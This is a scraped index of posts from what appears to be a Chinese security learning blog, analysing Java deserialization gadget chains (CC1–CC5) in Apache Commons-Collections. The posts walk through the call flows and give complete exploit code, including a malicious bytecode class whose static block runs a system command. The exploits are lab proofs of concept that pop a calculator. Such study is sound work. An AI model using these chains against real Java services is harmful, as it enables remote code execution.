System.out.println(transformers[0]); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); hashmap.put(\u0026#34;value\u0026#34;,\u0026#34;456\u0026#34;); Map\u0026lt;Object,Object\u0026gt; decoratemap = LazyMap.decorate(hashmap,chainedTransformer); // decoratemap.get(Runtime.class); TiedMapEntry.getValue触发LazyMap.get 1 2 TiedMapEntry tiedMapEntry = new TiedMapEntry(decoratemap,Runtime.class); // tiedMapEntry.toString(); 回到链首 可以看到存在两个toString方法\n当实例化BadAttributeValueExpException传入参数TiedMapEntry后\nval也会得到TiedMapEntry,从而进入链子\n所以需要先给个假的,再通过反射修改val的值\n1 2 3 4 5 BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null); Class c = Class.forName(\u0026#34;javax.management.BadAttributeValueExpException\u0026#34;); Field field = c.getDeclaredField(\u0026#34;val\u0026#34;); field.setAccessible(true); field.set(badAttributeValueExpException,tiedMapEntry); 完整exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 Transformer[] transformers = { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}), }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // chainedTransformer.transform(Runtime.class); // System.out.println(transformers[0]); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); hashmap.put(\u0026#34;value\u0026#34;,\u0026#34;456\u0026#34;); Map\u0026lt;Object,Object\u0026gt; decoratemap = LazyMap.decorate(hashmap,chainedTransformer); // decoratemap.get(Runtime.class); TiedMapEntry tiedMapEntry = new TiedMapEntry(decoratemap,Runtime.class); // tiedMapEntry.toString(); BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null); Class c = Class.forName(\u0026#34;javax.management.BadAttributeValueExpException\u0026#34;); Field field = c.getDeclaredField(\u0026#34;val\u0026#34;); field.setAccessible(true); field.set(badAttributeValueExpException,tiedMapEntry); serialize(badAttributeValueExpException); unserialize(\u0026#34;ser.bin\u0026#34;); 流程图 1 2 3 4 5 6 7 BadAttributeValueExpException.readObject() TiedMapEntry.toString() TiedMapEntry.getValue() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() ","date":"2025-01-03T15:21:39+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc5/11_hudcb513bef0ec34084044ec1d01500df8_147529_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc5/","title":"java反序列化之Commons-Collections-CC5链"},{"content":"链子图 cc2链就是如何将InstatiateTransformer和InvokeTransformer以及\nInvokeTransformer和TemplatesImpl串一起\nInstatiateTransformer和InvokeTransformer transformer赋值为InvokerTransformer\nInvokeTransformer和TemplatesImpl InvokeTransformer的transformer是将通过反射,\n这里可以反射调用TemplatesImpl的newTransformer从而串在一起\n怎么将TemplatesImpl传入?\nadd传入的会作为transform的参数\n要调用到TemplatesImpl.newTransformer,add要传入TemplatesImpl的对象\n1 2 priorityQueue.add(templates); priorityQueue.add(templates); 完整exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 TemplatesImpl templates = new TemplatesImpl(); Class templatesClass = templates.getClass(); Field nameField = templatesClass.getDeclaredField(\u0026#34;_name\u0026#34;); nameField.setAccessible(true); nameField.set(templates,\u0026#34;Y9sR\u0026#34;); Field bytecodesField = templatesClass.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); bytecodesField.setAccessible(true); byte[] evil = Files.readAllBytes(Paths.get(\u0026#34;E://calc.class\u0026#34;)); byte[][] codes = {evil}; bytecodesField.set(templates,codes); InvokerTransformer invokerTransformer = new InvokerTransformer\u0026lt;\u0026gt;(\u0026#34;newTransformer\u0026#34;,new Class[]{},new Object[]{}); // invokerTransformer.transform(templates); TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); PriorityQueue priorityQueue = new PriorityQueue\u0026lt;\u0026gt;(transformingComparator); priorityQueue.add(templates); priorityQueue.add(templates); Class c = TransformingComparator.class; Field field1 = c.getDeclaredField(\u0026#34;transformer\u0026#34;); field1.setAccessible(true); field1.set(transformingComparator,invokerTransformer); // serialize(priorityQueue); unserialize(\u0026#34;ser.bin\u0026#34;); 但是弹不了,很奇怪,调试的时候能进入TemplatesImpl的defineClass\n流程 1 2 3 4 5 6 7 8 9 10 11 12 PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() TransformingComparator.compare() InvokerTransformer.transform() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() TemplatesImpl.defineClass() ClassLoader.defineClass() newInstance ","date":"2025-01-03T15:21:33+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc2/8_huf0a7bf85ca933339987e45feafcb5a5e_534423_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc2/","title":"java反序列化之Commons-Collections-CC2链"},{"content":"环境 JDK8u65 Maven 3.6.3 Commons-Collections 4.0 1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.commons\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-collections4\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; CC4链分析 从尾部向首部分析，尾部命令执行的方式就两种，反射或是动态加载字节码。因为 CC4 链上只是去掉了 InvokerTransformer 的 Serializable 继承，所以最后的命令执行不受影响。 既然 InvokerTransformer 这里用不了了，我们去找谁调用了 transform() 方法，这里我去找的是 InstantiateTransformer 类，因为它上一步是 InvokerTransformer。\n进行 find usages，在 TransformingComparator 这个类中的 compare() 方法调用了 transform() 方法。而 compare() 这个方法也是我们比较喜欢的这种，因为它非常常见。\n找到PriorityQueue类\n在同一个类找下去\n最后找到readObject首部\n刚好继承了序列化接口\n和cc3尾部链子到InstantiateTransformer.transform()后面都是同一条链子\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 TemplatesImpl templates = new TemplatesImpl(); Class templatesclass = templates.getClass(); Field name = templatesclass.getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(templates,\u0026#34;Y9sR\u0026#34;); Field codes = templatesclass.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); codes.setAccessible(true); byte[] evil = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\javawork\\\\cc3\\\\src\\\\main\\\\java\\\\cc3\\\\calc.class\u0026#34;)); //{}包含一个数组的数组 byte[][] code = {evil}; codes.set(templates,code); Field field = templatesclass.getDeclaredField(\u0026#34;_tfactory\u0026#34;); field.setAccessible(true); field.set(templates,new TransformerFactoryImpl()); // templates.newTransformer(); Class\u0026lt;TrAXFilter\u0026gt; trAXFilter = TrAXFilter.class; InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates} ); // instantiateTransformer.transform(trAXFilter); Transformer[] transformers = { new ConstantTransformer(TrAXFilter.class),instantiateTransformer, instantiateTransformer }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer); PriorityQueue priorityQueue = new PriorityQueue(transformingComparator); // serialize(priorityQueue); unserialize(\u0026#34;ser.bin\u0026#34;); } 但是弹不了计算器\n问题解决 再readObject和heapify打断点\ndebug的时候看到到heapify没有进for循环,直接跳出程序,没进入到链子\n当给size赋值为2时,结果刚好1-1=0,满足i\u0026gt;=0,能进入循环,所以需要找到size赋值的地方\n加上之后发现序列化运行的时候也会直接弹计算器\n进入add方法\n只需要在add之前给TransformingComparator传入一个无关的东西,add的时候进入不了链子,再通过反射来修改\n最终exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 TemplatesImpl templates = new TemplatesImpl(); Class templatesclass = templates.getClass(); Field name = templatesclass.getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(templates,\u0026#34;Y9sR\u0026#34;); Field codes = templatesclass.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); codes.setAccessible(true); byte[] evil = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\javawork\\\\cc3\\\\src\\\\main\\\\java\\\\cc3\\\\calc.class\u0026#34;)); //{}包含一个数组的数组 byte[][] code = {evil}; codes.set(templates,code); Field field = templatesclass.getDeclaredField(\u0026#34;_tfactory\u0026#34;); field.setAccessible(true); field.set(templates,new TransformerFactoryImpl()); // templates.newTransformer(); Class\u0026lt;TrAXFilter\u0026gt; trAXFilter = TrAXFilter.class; InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates} ); // instantiateTransformer.transform(trAXFilter); Transformer[] transformers = { new ConstantTransformer(TrAXFilter.class),instantiateTransformer, instantiateTransformer }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); PriorityQueue priorityQueue = new PriorityQueue(transformingComparator); priorityQueue.add(1); priorityQueue.add(2); Class c = TransformingComparator.class; Field field1 = c.getDeclaredField(\u0026#34;transformer\u0026#34;); field1.setAccessible(true); field1.set(transformingComparator,chainedTransformer); serialize(priorityQueue); unserialize(\u0026#34;ser.bin\u0026#34;); 成功弹计算器\n流程图 1 2 3 4 5 6 7 8 9 10 11 12 13 14 PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() TransformingComparator.compare() //后面就是cc3链的后半部分 InstantiateTransformer.transform() TrAXFilter.TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() TemplatesImpl.defineClass() ClassLoader.defineClass() newInstance ","date":"2025-01-03T15:21:30+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc4/10_hue3933a2baba93b632a9ce45c6cb3a05b_145366_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc4/","title":"java反序列化之Commons-Collections-CC4链"},{"content":"字节码加载知识 利用 ClassLoader#defineClass 直接加载字节码的手段。 在这一条小链子当中，流程图可以绘制如下。\n这里我们可以正向看，首先是 loadClass()，它的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 findClass()。\n对于 findClass() 方法\n根据名称或位置加载 .class 字节码,然后使用 defineClass，代码实例如下。 通常由子类去实现 JAVA\n1 2 3 4 5 protected Class\u0026lt;?\u0026gt; findClass(String name) throws ClassNotFoundException { throw new ClassNotFoundException(name); } // findClass 方法的源代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 class NetworkClassLoader extends ClassLoader { String host; int port; public Class findClass(String name) { byte[] b = loadClassData(name); return defineClass(name, b, 0, b.length); } private byte[] loadClassData(String name) { // load the class data from the connection } } // 子类的实现方式 defineClass() 的作用是处理前面传入的字节码，将其处理成真正的 Java 类。 此时的 defineClass() 方法是有局限性的，因为它只是加载类，并不执行类。若需要执行，则需要先进行 newInstance() 的实例化。\n现在我们的 defineClass() 方法的作用域为 protected，我们需要找到作用域为 public 的类，方便我们利用。照样 find usages\nTemplatesImpl 解析 这里的 defineClass() 方法没有标注作用域，默认为 defalut，也就是说自己的类里面可以调用，我们继续 find usages\n在同类下找到defineTransletClass方法中看到调用了defineClass\n还是private,继续找调用defineTransletClass\n以上三个方法都调用了defineTransletClass,为什么选择它?\n因为其调用了 defineTransletClasses() 方法，并且这里有一个 newInstance() 实例化的过程，如果能走完这个函数那么就能动态执行代码，但是因为它是私有的，所以继续找。\n找到public修饰的newTransformer方法,接下就是处理限制条件了\n_bytecodes解决 _bytecodes 的值，这里需要的是一个二维数组，所以我们创建一个二维数组。但是 _bytecodes 作为传递进 defineClass 方法的值是一个一维数组。而这个一维数组里面我们需要存放恶意的字节码。这一段伪代码可以这样写。\n先写个恶意类并编译\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package cc3; import java.io.IOException; public class calc { //静态代码块实例化的时候会自动运行 static { try { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } catch (IOException e) { e.printStackTrace(); } } } 1 2 3 byte[] evil = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\javawork\\\\cc3\\\\src\\\\main\\\\java\\\\cc3\\\\calc.class\u0026#34;)); //{}包含一个数组的数组 byte[][] code = {evil}; _tfactory解决 transient保证了这个变量在序列化之后无法被访问\n在 readObject() 方法中，找到了 _tfactory 的初始化定义。\n刚好能在反序列化的时候初始化,就能让_tfactory值不为null\n通过反射修改\n1 2 3 Field field = templatesclass.getDeclaredField(\u0026#34;_tfactory\u0026#34;); field.setAccessible(true); field.set(templates,new TransformerFactoryImpl()); 前面的_name和_bytecodes也是通过反射来修改\n完整exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 TemplatesImpl templates = new TemplatesImpl(); Class templatesclass = templates.getClass(); Field name = templatesclass.getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(templates,\u0026#34;Y9sR\u0026#34;); Field codes = templatesclass.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); codes.setAccessible(true); byte[] evil = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\javawork\\\\cc3\\\\src\\\\main\\\\java\\\\cc3\\\\calc.class\u0026#34;)); //{}包含一个数组的数组 byte[][] code = {evil}; codes.set(templates,code); Field field = templatesclass.getDeclaredField(\u0026#34;_tfactory\u0026#34;); field.setAccessible(true); field.set(templates,new TransformerFactoryImpl()); templates.newTransformer(); 运行完但是不弹计算器且报错\n空指针报错\n看报错是在422行空指针报错,打了断点\n死在了else这里\n这里要么_auxClasses赋值,要么if判断正确不进入else\n如果给_auxClasses赋值,在下面的if判断时,\u0026lt;0会抛出异常\n所以这里让上面的if判断正确好点\n分析for这里的代码\n1 2 3 4 5 6 7 8 9 _class[i] = loader.defineClass(_bytecodes[i]); //_class这里会得到_bytecodes的字节码加载的类 final Class superClass = _class[i].getSuperclass(); //这里是得到_bytescodes类的父类 // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) { //判断字节码的类是否继承了ABSTRACT_TRANSLET _transletIndex = i; } 所以只需要给我们的恶意类加上继承AbstractTranslet\n重新编译一下calc.java运行后弹计算器\nCC1 链的 TemplatesImpl 的实现方式 \u0026lt;font style=\u0026quot;color:rgb(80, 80, 92);background-color:rgb(247, 247, 247);\u0026quot;\u0026gt;TemplatesImpl 只是将原本的命令执行变成代码执行的方式所以在不考虑黑名单的情况下，如果可以进行命令执行，则一定可以通过动态加载字节码进行代码执行。\u0026lt;/font\u0026gt;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 TemplatesImpl templates = new TemplatesImpl(); Class templatesclass = templates.getClass(); Field name = templatesclass.getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(templates,\u0026#34;Y9sR\u0026#34;); Field codes = templatesclass.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); codes.setAccessible(true); byte[] evil = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\javawork\\\\cc3\\\\src\\\\main\\\\java\\\\cc3\\\\calc.class\u0026#34;)); //{}包含一个数组的数组 byte[][] code = {evil}; codes.set(templates,code); Field field = templatesclass.getDeclaredField(\u0026#34;_tfactory\u0026#34;); field.setAccessible(true); field.set(templates,new TransformerFactoryImpl()); // templates.newTransformer(); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(templates), new InvokerTransformer(\u0026#34;newTransformer\u0026#34;, null, null), }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(templates); 能弹计算器\n后面的链子都是正常用cc1的\n完整exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 TemplatesImpl templates = new TemplatesImpl(); Class templatesclass = templates.getClass(); Field name = templatesclass.getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(templates,\u0026#34;Y9sR\u0026#34;); Field codes = templatesclass.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); codes.setAccessible(true); byte[] evil = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\javawork\\\\cc3\\\\src\\\\main\\\\java\\\\cc3\\\\calc.class\u0026#34;)); //{}包含一个数组的数组 byte[][] code = {evil}; codes.set(templates,code); Field field = templatesclass.getDeclaredField(\u0026#34;_tfactory\u0026#34;); field.setAccessible(true); field.set(templates,new TransformerFactoryImpl()); // templates.newTransformer(); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(templates), new InvokerTransformer(\u0026#34;newTransformer\u0026#34;, null, null), }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // chainedTransformer.transform(templates); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); Map\u0026lt;Object,Object\u0026gt; decoratemap = LazyMap.decorate(hashmap,chainedTransformer); // decoratemap.get(Runtime.class); Class clz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor\u0026lt;?\u0026gt; constructor =clz.getDeclaredConstructor(Class.class,Map.class); constructor.setAccessible(true); Object o = constructor.newInstance(Override.class,decoratemap); System.out.println(o.getClass()); //AnnotationInvocationHandler作为代理类,需要将AnnotationInvocationHandler强转为InvocationHandler,才能调用AnnotationInvocationHandler的invoke方法 InvocationHandler invocationHandler = (InvocationHandler) o; Map proxymap =(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},invocationHandler); // proxymap.entrySet(); Object ob = constructor.newInstance(Override.class,proxymap); serialize(ob); unserialize(\u0026#34;ser.bin\u0026#34;); CC6 链的 TemplatesImpl 的实现方式 完整exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 TemplatesImpl templates = new TemplatesImpl(); Class templatesclass = templates.getClass(); Field name = templatesclass.getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(templates,\u0026#34;Y9sR\u0026#34;); Field codes = templatesclass.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); codes.setAccessible(true); byte[] evil = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\javawork\\\\cc3\\\\src\\\\main\\\\java\\\\cc3\\\\calc.class\u0026#34;)); //{}包含一个数组的数组 byte[][] code = {evil}; codes.set(templates,code); Field field = templatesclass.getDeclaredField(\u0026#34;_tfactory\u0026#34;); field.setAccessible(true); field.set(templates,new TransformerFactoryImpl()); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(templates), new InvokerTransformer(\u0026#34;newTransformer\u0026#34;, null,null), }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u0026lt;Object, Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); //给假的 Map\u0026lt;Object,Object\u0026gt; lazymap = LazyMap.decorate(hashmap,new ConstantTransformer(\u0026#34;1\u0026#34;)); //因为有ConstantTransformer在,所以key不一定要Runtime.class TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,\u0026#34;abc\u0026#34;); // tiedMapEntry.hashCode(); HashMap\u0026lt;Object,Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(tiedMapEntry,\u0026#34;123\u0026#34;); lazymap.remove(\u0026#34;abc\u0026#34;); Class c = LazyMap.class; Field factoryfield = c.getDeclaredField(\u0026#34;factory\u0026#34;); factoryfield.setAccessible(true); factoryfield.set(lazymap,chainedTransformer); serialize(map); unserialize(\u0026#34;ser.bin\u0026#34;); 回到cc3链 目前是到了newTransformer,继续找谁调用了newTransformer\n这里主要是找到了四个，我们一个个讲解一下为什么是 TrAXFilter 而不是其他的。 Process 这个在 main 里面，是作为一般对象用的，所以不用它。\n第二个 getOutProperties，是反射调用的方法，可能会在 fastjson 的漏洞里面被调用。\nTransformerFactoryImpl 不能序列化，如果还想使用它也是也可能的，但是需要传参，我们需要去找构造函数。而它的构造函数难传参。\n最后，TrAXFilter，它也是不能序列化的，但是我们去到它的构造函数看，是有搞头的。\n只需要调用TrAXFilter的构造函数就行了\nCC3 这里的作者没有调用InvokerTransformer，而是调用了一个新的类 InstantiateTransformer。\nInstantiateTransformer 这个类是用来初始化 Transformer 的，我们去找 InstantiateTransformer 类下的 transform 方法。 完美契合我们的需求！\n写exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 TemplatesImpl templates = new TemplatesImpl(); Class templatesclass = templates.getClass(); Field name = templatesclass.getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(templates,\u0026#34;Y9sR\u0026#34;); Field codes = templatesclass.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); codes.setAccessible(true); byte[] evil = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\javawork\\\\cc3\\\\src\\\\main\\\\java\\\\cc3\\\\calc.class\u0026#34;)); //{}包含一个数组的数组 byte[][] code = {evil}; codes.set(templates,code); Field field = templatesclass.getDeclaredField(\u0026#34;_tfactory\u0026#34;); field.setAccessible(true); field.set(templates,new TransformerFactoryImpl()); // templates.newTransformer(); Class\u0026lt;TrAXFilter\u0026gt; trAXFilter = TrAXFilter.class; InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates} ); instantiateTransformer.transform(trAXFilter); 弹计算器\n找transform找到熟悉的LazyMap函数\n想到cc1的正链\n直接把前半部分的链拿来用\n序列化正常,但是反序列化报错\n想起之前的\nsetValue传参无法可控\n所以这里还需要借助ConstantTransformer和ChainedTransformer\n1 2 3 4 Transformer[] transformers = { new ConstantTransformer(TrAXFilter.class),instantiateTransformer }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); 完整exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 TemplatesImpl templates = new TemplatesImpl(); Class templatesclass = templates.getClass(); Field name = templatesclass.getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(templates,\u0026#34;Y9sR\u0026#34;); Field codes = templatesclass.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); codes.setAccessible(true); byte[] evil = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\javawork\\\\cc3\\\\src\\\\main\\\\java\\\\cc3\\\\calc.class\u0026#34;)); //{}包含一个数组的数组 byte[][] code = {evil}; codes.set(templates,code); Field field = templatesclass.getDeclaredField(\u0026#34;_tfactory\u0026#34;); field.setAccessible(true); field.set(templates,new TransformerFactoryImpl()); // templates.newTransformer(); Class\u0026lt;TrAXFilter\u0026gt; trAXFilter = TrAXFilter.class; InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates} ); // instantiateTransformer.transform(trAXFilter); Transformer[] transformers = { new ConstantTransformer(TrAXFilter.class),instantiateTransformer, instantiateTransformer }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u0026lt;Object,Object\u0026gt; hashmap = new HashMap\u0026lt;\u0026gt;(); Map\u0026lt;Object,Object\u0026gt; decoratemap = LazyMap.decorate(hashmap,chainedTransformer); // decoratemap.get(Runtime.class); Class clz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor\u0026lt;?\u0026gt; constructor =clz.getDeclaredConstructor(Class.class,Map.class); constructor.setAccessible(true); Object o = constructor.newInstance(Override.class,decoratemap); // System.out.println(o.getClass()); //AnnotationInvocationHandler作为代理类,需要将AnnotationInvocationHandler强转为InvocationHandler,才能调用AnnotationInvocationHandler的invoke方法 InvocationHandler invocationHandler = (InvocationHandler) o; Map proxymap =(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},invocationHandler); // proxymap.entrySet(); Object ob = constructor.newInstance(Override.class,proxymap); // serialize(ob); unserialize(\u0026#34;ser.bin\u0026#34;); 成功弹计算器\n流程图 1 2 3 4 5 6 7 8 9 10 11 12 13 ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() ProxyMap.entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() InstantiateTransformer.transform() TrAXFilter.TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() TemplatesImpl.defineClass() ClassLoader.defineClass() newInstance ","date":"2025-01-03T15:21:25+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc3/9_hu85212b583738171f073e269c79fb2d2a_215178_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/%E9%93%BE%E5%AD%90/cc3/","title":"java反序列化之Commons-Collections-CC3链"},{"content":"链尾InvokerTransformer.transform 存在invoke,执行危险函数\n1 2 3 4 5 Runtime runtime = Runtime.getRuntime(); Class c = Runtime.class; Method method = c.getDeclaredMethod(\u0026#34;exec\u0026#34;,String.class); method.invoke(runtime,\u0026#34;calc\u0026#34;); 和runtime通过反射弹计算器很像,而且参数都可控 一一对应,调用transform()方法将Runtime对象传入,相当于反射了执行exec危险函数\n1 2 3 4 5 6 7 8 Runtime runtime = Runtime.getRuntime(); Class c = Runtime.class; //Method method = c.getDeclaredMethod(\u0026#34;exec\u0026#34;,String.class); //method.invoke(runtime,\u0026#34;calc\u0026#34;); //以上是runtime的弹计算器操作 //public构造方法,无需反射 InvokerTransformer invokerTransformer = new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}); invokerTransformer.transform(runtime); 找到链尾,继续找transform的同方法不同调用类\nTransformedMap.checkValue()触发transformer 圈的就是还是同样的transformer类的transform方法\n下划线的就是新的类的transform方法\n其中 TransformedMap 类中存在 checkSetValue() 方法调用了 transform() 方法。\n接下来我们去看一看 valueTransformer.checkSetValue 的 valueTransformer 是什么东西，最终在 TransformedMap 的构造函数中发现了 valueTransformer\n因为 TransformedMap 的构造方法作用域是 protected，我们还需要去找一找谁调用了 TransformedMap 的构造方法。 在 decorate() 静态方法中创建了 TransformedMap 对象\nInvokerTransformer继承了Transformer,所以decorate(Transformer valueTransformer)能传入InvokerTransformer对象\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Runtime runtime = Runtime.getRuntime(); Class c = Runtime.class; //Method method = c.getDeclaredMethod(\u0026#34;exec\u0026#34;,String.class); //method.invoke(runtime,\u0026#34;calc\u0026#34;); //以上是runtime的弹计算器操作 //public构造方法,无需反射 InvokerTransformer invokerTransformer = new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}); invokerTransformer.transform(runtime); HashMap\u0026lt;Object,Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); //protected构造方法,decorate静态方法能返回一个TransformedMap对象 Map decoratemap = TransformedMap.decorate(map,null,invokerTransformer); //protected checkSetValue 要通过反射 Class\u0026lt;TransformedMap\u0026gt; transformedMapClass = TransformedMap.class; Method method = transformedMapClass.getDeclaredMethod(\u0026#34;checkSetValue\u0026#34;, Object.class); method.setAccessible(true); method.invoke(decoratemap,runtime); 成功弹计算器\n继续找调用checkSetValue的不同类\nAbstractInputCheckedMapDecorator.setValue触发checkSetValue 所以，我们在进行 .decorate 方法调用，进行 Map 遍历的时候，就会走到 setValue() 当中，而 setValue() 就会调用 checkSetValue\n遍历调用checkSetValue的原理 1 2 3 4 for(Map.Entry entry:decoratemap.entrySet()) { entry.setValue(runtime); } AbstractInputCheckedMapDecorator的entrySet函数\nisSetValueChecking()默认为真,返回一个EntrySet的类\nthis是指当前实例,也就是TransformedMap\n此时参数(map.entrySet(),TransformedMap)\nmap.entrySet()返回由Map.Entry组成的原始集合\n在EntrySet类中，迭代器使用了EntrySetInterator进行迭代\n重写了迭代中会使用的next()，在这里就返回了MapEntry装饰的Map.Entry\n从而调用\u0026lt;font style=\u0026quot;color:rgb(33, 53, 71);\u0026quot;\u0026gt;MapEntry类的setValue()函数\u0026lt;/font\u0026gt;\n开断点运行的流程\n增强for循环工作原理如下：\n获取迭代器：调用集合对象的 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 130);background-color:rgb(241, 241, 241);\u0026quot;\u0026gt;iterator()\u0026lt;/font\u0026gt; 方法，获取一个 \u0026lt;font style=\u0026quot;color:rgb(71, 101, 